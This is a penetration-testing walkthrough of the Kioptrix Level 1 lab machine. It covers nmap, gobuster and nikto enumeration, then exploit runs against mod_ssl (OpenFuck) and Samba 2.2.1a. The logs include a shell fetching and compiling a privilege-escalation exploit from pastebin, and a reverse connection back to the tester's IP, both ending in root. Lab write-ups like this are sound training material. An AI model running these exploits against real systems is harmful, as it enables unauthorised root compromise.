 #Kioptrix

IP : 192.168.24.160
OS : linux 

## Enumlation 

```
nmap -sV -sC -p- 192.168.24.160   
# Nmap 7.91 scan initiated Fri Jun 11 17:30:24 2021 as: nmap -sV -sC -p- -o scan 192.168.24.160
Nmap scan report for 192.168.24.160
Host is up (0.0026s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2021-06-11T15:35:47+00:00; +1m50s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: 1m49s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 11 17:33:57 2021 -- 1 IP address (1 host up) scanned in 213.52 seconds
```


### HTTP(s) 

Lets vists the website, mean while lets also do a gobuster on the site. 

![[Pasted image 20210611173118.png]]

#gobuster 
```
gobuster dir -u http://192.168.24.160 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 50   
\===============================================================         
Gobuster v3.1.0                                                         
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)            
\===============================================================         
\[+\] Url:                     http://192.168.24.160                      
\[+\] Method:                  GET                                       
\[+\] Threads:                 50                                         
\[+\] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt                                                     
\[+\] Negative Status codes:   404                                        
\[+\] User Agent:              gobuster/3.1.0                             
\[+\] Timeout:                 10s                                     
\===============================================================        
2021/06/11 17:12:20 Starting gobuster in directory enumeration mode   
\===============================================================        
/.html                (Status: 403) \[Size: 269\]                       
/.htm                 (Status: 403) \[Size: 268\]                         
/.                    (Status: 200) \[Size: 2890\]                        
/usage                (Status: 301) \[Size: 293\] \[--> http://127.0.0.1/usage/\]                                                                             
/manual               (Status: 301) \[Size: 294\] \[--> http://127.0.0.1/manual/\]                                                                           
/.htaccess            (Status: 403) \[Size: 273\]                         
/.htc                 (Status: 403) \[Size: 268\]                        
/mrtg                 (Status: 301) \[Size: 292\] \[--> http://127.0.0.1/mrtg/\]                                                                             
/.html\_var\_DE         (Status: 403) \[Size: 276\]                        
/.htpasswd            (Status: 403) \[Size: 273\]                          
/.html.               (Status: 403) \[Size: 270\]                        
/.html.html           (Status: 403) \[Size: 274\]                        
/.htpasswds           (Status: 403) \[Size: 274\]                        
/.htm.                (Status: 403) \[Size: 269\]                         
/.htmll               (Status: 403) \[Size: 270\]                       
/.html.old            (Status: 403) \[Size: 273\]                        
/.ht                  (Status: 403) \[Size: 267\]                        
/.html.bak            (Status: 403) \[Size: 273\]                        
/.htm.htm             (Status: 403) \[Size: 272\]                       
/.htgroup             (Status: 403) \[Size: 272\]                        
/.hta                 (Status: 403) \[Size: 268\]                         
/.html1               (Status: 403) \[Size: 270\]                         
/.html.LCK            (Status: 403) \[Size: 273\]                       
/.html.printable      (Status: 403) \[Size: 279\]             
/.htm.LCK             (Status: 403) \[Size: 272\]                        
/.html.php            (Status: 403) \[Size: 273\]                     
/.htaccess.bak        (Status: 403) \[Size: 277\]                       
/.htx                 (Status: 403) \[Size: 268\]                       
/.htmls               (Status: 403) \[Size: 270\]                       
/.htlm                (Status: 403) \[Size: 269\]                       
/.htuser              (Status: 403) \[Size: 271\]                     
/.html-               (Status: 403) \[Size: 270\]                      
/.htm2                (Status: 403) \[Size: 269\]                             
\===============================================================  
2021/06/11 17:12:51 Finished
```

#nikto

```
nikto -h http://192.168.24.160/  
\- Nikto v2.1.6  
\---------------------------------------------------------------------------  
\+ Target IP:          192.168.24.160  
\+ Target Hostname:    192.168.24.160  
\+ Target Port:        80  
\+ Start Time:         2021-06-11 17:41:27 (GMT2)  
\---------------------------------------------------------------------------  
\+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod\_ssl/2.8.4 OpenSSL/0.9.6b  
\+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 05:12:46 2001  
\+ The anti-clickjacking X-Frame-Options header is not present.  
\+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS  
\+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type  
\+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header  
\+ mod\_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)  
\+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.  
\+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.  
\+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE    
\+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST  
\+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.  
\+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.  
\+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod\_rewrite and mod\_cgi. CAN-2003-0542.  
\+ mod\_ssl/2.8.4 - mod\_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.  
\+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.  
\+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).  
\+ OSVDB-3268: /manual/: Directory indexing found.  
\+ OSVDB-3092: /manual/: Web server manual found.  
\+ OSVDB-3268: /icons/: Directory indexing found.  
\+ OSVDB-3233: /icons/README: Apache default file found.  
\+ OSVDB-3092: /test.php: This might be interesting...  
\+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.  
\+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.  
\+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.  
\+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.  
\+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.  
\+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.  
\+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.  
\+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.  
\+ /shell?cat+/etc/hosts: A backdoor was identified.  
\+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host  
\+ End Time:           2021-06-11 17:41:54 (GMT2) (27 seconds)  
\---------------------------------------------------------------------------  
\+ 1 host(s) tested
```

The server appear to be vulnerable to remote attacks 
**_ssl 2.8.7 and lower are vulnerable to a remote buffer**



### SMB

```
msf6 auxiliary(scanner/smb/smb\_version) > run  
  
\[\*\] 192.168.24.160:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)  
\[\*\] 192.168.24.160:139    -   Host could not be identified: Unix (Samba 2.2.1a)  
\[\*\] 192.168.24.160:       - Scanned 1 of 1 hosts (100% complete)  
\[\*\] Auxiliary module execution completed
```


Lets search searchsploit for possible vulnerability 

```
 Exploit Title |  Path
[01;31m[KSamba[m[K 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)| osx/remote/9924.rb
[01;31m[KSamba[m[K < 2.2.8 (Linux/BSD) - Remote Code Execution | multiple/remote/10.c
[01;31m[KSamba[m[K < 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt
[01;31m[KSamba[m[K < 3.6.2 (x86) - Denial of Service (PoC)  | linux_x86/dos/36741.py

Shellcodes: No Results
```

We see there are multiple vulnerability on the SMB service. 


## Exploit 
### mod_ssl 2.8.7
[Exploit](https://github.com/heltonWernik/OpenLuck)
**_ssl 2.8.7 and lower are vulnerable to a remote buffer**
```
./OpenFuck 0x6b 192.168.24.160 -c 40  
  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open \*  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE \*  
\* #hackarena  irc.brasnet.org                                     \*  
\* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname \*  
\* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam \*  
\* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ \*  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
  
Connection... 40 of 40  
Establishing SSL connection  
cipher: 0x4043808c   ciphers: 0x80f8070  
Ready to send shellcode  
Spawning shell...  
bash: no job control in this shell  
bash-2.05$    
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt    
\--12:01:51--  https://pastebin.com/raw/C7v25Xr9  
          => \`ptrace-kmod.c'  
Connecting to pastebin.com:443... connected!  
HTTP request sent, awaiting response... 200 OK  
Length: unspecified \[text/plain\]  
  
   0K ...                                                    @   1.28 MB/s  
  
12:01:51 (786.33 KB/s) - \`ptrace-kmod.c' saved \[4026\]  
  
ptrace-kmod.c:183:1: warning: no newline at end of file  
\[+\] Attached to 6419  
\[+\] Waiting for signal  
\[+\] Signal caught  
\[+\] Shellcode placed at 0x4001189d  
\[+\] Now wait for suid shell...  
id  
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

After exploiting the vulnerability we have root access on the machine. 


## Samba 
[Exploit](https://raw.githubusercontent.com/piyush-saurabh/exploits/master/smb-exploit.c)
Exploiting samba vulnerability version : Samba 2.2.1a

```
./smb-exploit  0 192.168.24.160 192.168.24.176  
\[+\] Listen on port: 45295  
\[+\] Connecting back to: \[192.168.24.176:45295\]  
\[+\] Target: Linux  
\[+\] Connected to \[192.168.24.160:139\]  
\[+\] Please wait in seconds...!  
\[+\] Yeah, I have a root ....!  
\------------------------------  
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown  
uid=0(root) gid=0(root) groups=99(nobody)
```